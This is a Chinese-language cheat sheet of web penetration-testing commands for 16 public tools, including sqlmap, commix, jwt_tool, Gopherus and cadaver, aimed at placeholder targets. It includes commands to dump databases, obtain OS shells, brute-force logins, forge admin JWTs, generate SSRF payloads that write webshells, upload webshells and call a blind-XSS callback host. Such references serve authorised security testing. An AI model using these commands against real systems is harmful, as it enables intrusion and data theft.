# Web渗透

_16 条工具命令_

### SQLMap  `sqlmap`
_自动化SQL注入工具_

**Step 0**
> 对URL进行SQL注入测试
```
sqlmap -u "http://target.com/page?id=1"
```
**语法解析：**
- `sqlmap` — SQLMap工具 _command_
- `-u` — 指定目标URL _parameter_

**Step 0**
> 只测试指定的参数
```
sqlmap -u "http://target.com/page?id=1&name=test" -p id
```
**语法解析：**
- `-p` — 指定要测试的参数 _parameter_

**Step 0**
> 测试POST请求
```
sqlmap -u "http://target.com/login" --data="user=admin&pass=123"
```
**语法解析：**
- `--data=` — POST数据 _parameter_

**Step 0**
> 使用Cookie进行认证
```
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=xxx"
```
**语法解析：**
- `--cookie=` — 设置Cookie _parameter_

**Step 0**
> 指定后端数据库类型
```
sqlmap -u "http://target.com/page?id=1" --dbms=mysql
```
**语法解析：**
- `--dbms=` — 数据库类型(mysql,mssql,oracle等) _parameter_

**Step 0**
> 获取所有数据库名
```
sqlmap -u "http://target.com/page?id=1" --dbs
```
**语法解析：**
- `--dbs` — 枚举数据库 _parameter_

**Step 0**
> 获取指定数据库的表
```
sqlmap -u "http://target.com/page?id=1" -D database_name --tables
```
**语法解析：**
- `-D` — 指定数据库 _parameter_
- `--tables` — 枚举表 _parameter_

**Step 0**
> 获取指定表的列
```
sqlmap -u "http://target.com/page?id=1" -D db -T table --columns
```
**语法解析：**
- `-T` — 指定表 _parameter_
- `--columns` — 枚举列 _parameter_

**Step 0**
> 提取指定列的数据
```
sqlmap -u "http://target.com/page?id=1" -D db -T table -C col1,col2 --dump
```
**语法解析：**
- `-C` — 指定列 _parameter_
- `--dump` — 提取数据 _parameter_

**Step 0**
> 尝试获取操作系统Shell
```
sqlmap -u "http://target.com/page?id=1" --os-shell
```
**语法解析：**
- `--os-shell` — 获取OS交互式Shell _parameter_

**Step 0**
> 通过代理发送请求
```
sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"
```
**语法解析：**
- `--proxy=` — 设置代理服务器 _parameter_

**Step 0**
> 指定注入技术类型
```
sqlmap -u "http://target.com/page?id=1" --technique=BEUST
```
**语法解析：**
- `--technique=` — B=布尔盲注,E=报错注入,U=联合查询,S=堆叠,T=时间盲注 _parameter_

**Step 0**
> 设置扫描级别和风险等级
```
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3
```
**语法解析：**
- `--level=` — 扫描级别(1-5)，越高越全面 _parameter_
- `--risk=` — 风险等级(1-3)，越高越危险 _parameter_

---

### Burp Suite  `burpsuite`
_Web安全测试平台_

**Step 0**
> 配置代理监听
```
Proxy -> Options -> Proxy Listeners -> Add -> Port 8080
```

**Step 0**
> 开启请求拦截
```
Proxy -> Intercept -> Intercept is on
```

**Step 0**
> 发送请求到Repeater
```
右键 -> Send to Repeater (Ctrl+R)
```

**Step 0**
> 发送请求到Intruder
```
右键 -> Send to Intruder (Ctrl+I)
```

**Step 0**
> 四种攻击类型说明
```
Sniper: 单个payload
Battering ram: 同一payload
Pitchfork: 多个payload并行
Cluster bomb: 多个payload组合
```

**Step 0**
> 启动主动扫描
```
Dashboard -> New Scan -> 选择目标URL
```

**Step 0**
> 安装BApp插件
```
Extender -> BApp Store -> 选择插件 -> Install
```

**Step 0**
> 复制请求内容
```
右键 -> Copy to clipboard -> Request
```

---

### FFUF  `ffuf`
_快速Web模糊测试工具_

**Step 0**
> 基础目录爆破
_platform: linux_
```
ffuf -u http://target.com/FUZZ -w wordlist.txt
```

**Step 0**
> 添加文件扩展名
_platform: linux_
```
ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt
```

**Step 0**
> GET参数测试
_platform: linux_
```
ffuf -u http://target.com/?param=FUZZ -w wordlist.txt
```

**Step 0**
> POST数据测试
_platform: linux_
```
ffuf -u http://target.com -X POST -d "user=FUZZ&pass=test" -w wordlist.txt
```

**Step 0**
> Host头测试
_platform: linux_
```
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w wordlist.txt
```

**Step 0**
> 匹配特定状态码
_platform: linux_
```
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302
```

**Step 0**
> 过滤特定响应大小
_platform: linux_
```
ffuf -u http://target.com/FUZZ -w wordlist.txt -fs 1234
```

**Step 0**
> 递归目录扫描
_platform: linux_
```
ffuf -u http://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2
```

---

### WFuzz  `wfuzz-tool`
_Web模糊测试工具_

**Step 0**
> 基础目录爆破
_platform: linux_
```
wfuzz -c -w wordlist.txt http://target.com/FUZZ
```

**Step 0**
> 过滤404响应
_platform: linux_
```
wfuzz -c -w wordlist.txt --hc 404 http://target.com/FUZZ
```

**Step 0**
> POST数据测试
_platform: linux_
```
wfuzz -c -w wordlist.txt -d "user=FUZZ&pass=test" http://target.com/login
```

**Step 0**
> Cookie模糊测试
_platform: linux_
```
wfuzz -c -w wordlist.txt -b "session=FUZZ" http://target.com/
```

**Step 0**
> Host头测试
_platform: linux_
```
wfuzz -c -w wordlist.txt -H "Host: FUZZ.target.com" http://target.com/
```

**Step 0**
> 递归扫描
_platform: linux_
```
wfuzz -c -w wordlist.txt -R 2 http://target.com/FUZZ
```

---

### Nikto  `nikto`
_Web服务器漏洞扫描器，检测危险文件、过时组件和配置问题_

**Step 0**
> 对目标进行全面Web漏洞扫描
```
nikto -h https://target.com
```
**语法解析：**
- `nikto` — Web服务器漏洞扫描器 _command_
- `-h` — 目标主机 _parameter_

**Step 0**
> 扫描HTTPS服务
```
nikto -h target.com -p 8443 -ssl
```

**Step 0**
> 通过Burp代理进行扫描
```
nikto -h target.com -useproxy http://127.0.0.1:8080
```

**Step 0**
> 仅运行指定的测试插件
```
nikto -h target.com -Plugins "apache_expect_xss;outdated"
```

**Step 0**
> 输出HTML格式报告
```
nikto -h target.com -o report.html -Format htm
```

---

### OWASP ZAP  `zap`
_OWASP官方Web应用安全测试平台_

**Step 0**
> 快速自动化漏洞扫描
```
zap-cli quick-scan -s all -r https://target.com
# 或使用API
curl "http://localhost:8080/JSON/ascan/action/scan/?url=https://target.com"
```

**Step 0**
> 根据OpenAPI规范扫描API
```
zap-api-scan.py -t https://target.com/api/swagger.json -f openapi
```

**Step 0**
> 代理模式被动扫描
```
# 配置ZAP为代理(默认8080端口)
# 浏览器配置代理后正常浏览
# ZAP自动进行被动漏洞检测
```

**Step 0**
> 使用Docker容器化运行基线扫描
```
docker run -t ghcr.io/zaproxy/zaproxy zap-baseline.py -t https://target.com -r report.html
```

---

### Arjun  `arjun`
_HTTP参数发现工具，发现隐藏的GET/POST参数_

**Step 0**
> 发现隐藏的GET参数
```
arjun -u https://target.com/page
```
**语法解析：**
- `arjun` — HTTP参数发现工具 _command_
- `-u` — 目标URL _parameter_

**Step 0**
> 发现POST请求的隐藏参数
```
arjun -u https://target.com/api -m POST --include="Content-Type: application/json"
```

**Step 0**
> 使用自定义参数字典
```
arjun -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

**Step 0**
> 批量扫描多个URL，稳定模式
```
arjun -i urls.txt -o results.json --stable
```

---

### WFuzz  `wfuzz`
_Web应用模糊测试工具，用于暴力破解参数、目录、认证等_

**Step 0**
> 目录暴力破解，隐藏404
```
wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hc 404 https://target.com/FUZZ
```
**语法解析：**
- `-c` — 彩色输出 _parameter_
- `-z file,wordlist` — 指定字典文件作为payload _parameter_
- `--hc 404` — 隐藏404响应 _parameter_
- `FUZZ` — Payload注入点占位符 _variable_

**Step 0**
> 参数名Fuzz，隐藏空响应
```
wfuzz -c -z file,params.txt --hh 0 "https://target.com/api?FUZZ=test"
```

**Step 0**
> 双字典组合爆破登录
```
wfuzz -c -z file,users.txt -z file,passwords.txt --hc 403 -d "user=FUZZ&pass=FUZ2Z" https://target.com/login
```

**Step 0**
> Host头注入方式枚举子域名
```
wfuzz -c -z file,subs.txt --hc 404 -H "Host: FUZZ.target.com" https://target.com
```

---

### Commix  `commix`
_自动化命令注入漏洞检测和利用工具_

**Step 0**
> 自动检测命令注入点
```
commix --url="https://target.com/page?cmd=test"
```
**语法解析：**
- `commix` — 命令注入自动化工具 _command_
- `--url` — 目标URL(参数中含注入点) _parameter_

**Step 0**
> 指定POST参数进行注入测试
```
commix --url="https://target.com/api" --data="host=INJECT_HERE" -p host
```

**Step 0**
> 执行系统命令或获取交互式Shell
```
commix --url="https://target.com/page?ip=test" --os-cmd="id"
commix --url="https://target.com/page?ip=test" --os-shell
```

**Step 0**
> 使用编码绕过和时间盲注技术
```
commix --url="https://target.com/page?cmd=test" --tamper=base64encode --technique=t
```

---

### Dalfox  `dalfox`
_基于Go的高性能XSS漏洞扫描和参数分析工具_

**Step 0**
> 扫描单个URL的XSS漏洞
```
dalfox url "https://target.com/search?q=test"
```
**语法解析：**
- `dalfox` — XSS漏洞扫描工具 _command_
- `url` — 单URL扫描模式 _parameter_

**Step 0**
> 批量扫描，仅输出POC
```
cat urls.txt | dalfox pipe --silence --only-poc
```

**Step 0**
> 使用自定义Payload并启用WAF绕过
```
dalfox url "https://target.com/q=test" --custom-payload payloads.txt --waf-evasion
```

**Step 0**
> 使用Blind XSS回调检测
```
dalfox url "https://target.com/q=test" --blind https://your-xss-hunter.com
```

---

### XSStrike  `xsstrike`
_高级XSS检测工具，支持反射/存储/DOM型XSS检测_

**Step 0**
> 扫描反射型XSS
```
python3 xsstrike.py -u "https://target.com/search?q=test"
```

**Step 0**
> 测试POST参数的XSS
```
python3 xsstrike.py -u "https://target.com/comment" --data "content=test" --method POST
```

**Step 0**
> 使用模糊测试模式发现过滤规则
```
python3 xsstrike.py -u "https://target.com/q=test" --fuzzer
```

**Step 0**
> 爬取3层深度的所有页面并测试XSS
```
python3 xsstrike.py -u "https://target.com" --crawl -l 3
```

---

### Gopherus  `gopherus`
_生成Gopher协议Payload，用于SSRF攻击内部服务_

**Step 0**
> 生成攻击MySQL的Gopher Payload
```
python2 gopherus.py --exploit mysql
# 输入SQL查询语句后生成gopher://payload
```
**语法解析：**
- `--exploit mysql` — 指定目标服务类型 _parameter_

**Step 0**
> 生成攻击Redis的Gopher Payload
```
python2 gopherus.py --exploit redis
# 可生成写入webshell/计划任务/SSH密钥等payload
```

**Step 0**
> 生成攻击PHP-FPM/FastCGI的Payload
```
python2 gopherus.py --exploit fastcgi
# 输入要执行的命令
```

**Step 0**
> 生成通过SMTP发送邮件的Payload
```
python2 gopherus.py --exploit smtp
```

---

### Smuggler  `smuggler`
_HTTP请求走私漏洞检测工具_

**Step 0**
> 自动检测HTTP请求走私漏洞
```
python3 smuggler.py -u https://target.com
```
**语法解析：**
- `smuggler.py` — HTTP走私检测脚本 _command_

**Step 0**
> 测试CL.TE类型的请求走私
```
python3 smuggler.py -u https://target.com -t CL.TE
```

**Step 0**
> 从标准输入读取URL批量测试
```
cat urls.txt | python3 smuggler.py
```

---

### JWT Tool  `jwt-tool`
_JSON Web Token安全测试工具，支持伪造/破解/注入_

**Step 0**
> 解析并显示JWT的Header和Payload
```
jwt_tool eyJhbGciOi...
```
**语法解析：**
- `jwt_tool` — JWT安全测试工具 _command_

**Step 0**
> 自动尝试所有已知JWT攻击
```
jwt_tool -t https://target.com/api -rh "Authorization: Bearer eyJ..." -M at
```

**Step 0**
> 尝试将算法改为none绕过验证
```
jwt_tool eyJhbGciOi... -X a
```

**Step 0**
> 暴力破解HMAC密钥
```
jwt_tool eyJhbGciOi... -C -d /usr/share/wordlists/rockyou.txt
```

**Step 0**
> 使用已知密钥伪造Token，修改角色为admin
```
jwt_tool eyJhbGciOi... -S hs256 -p "secret_key" -I -pc role -pv admin
```

---

### GraphQLmap  `graphqlmap`
_GraphQL API渗透测试工具，支持自省查询和注入_

**Step 0**
> 通过自省查询导出完整Schema
```
python3 graphqlmap.py -u https://target.com/graphql --method POST -x dump_schema
```

**Step 0**
> 枚举所有可用的Query/Mutation字段
```
python3 graphqlmap.py -u https://target.com/graphql --method POST -x enum
```

**Step 0**
> 测试GraphQL参数的注入漏洞
```
python3 graphqlmap.py -u https://target.com/graphql --method POST -x nosqli
```

---

### Cadaver  `cadaver`
_WebDAV客户端工具，用于测试WebDAV服务_

**Step 0**
> 连接到WebDAV服务器
_platform: linux_
```
cadaver https://target.com/webdav/
```

**Step 0**
> 上传Webshell或文件到WebDAV目录
_platform: linux_
```
# 在cadaver交互式Shell中:
put shell.aspx
mput *.txt
```

**Step 0**
> 列出目录内容并下载文件
_platform: linux_
```
# cadaver Shell:
ls
get config.xml
mget *.bak
```

---
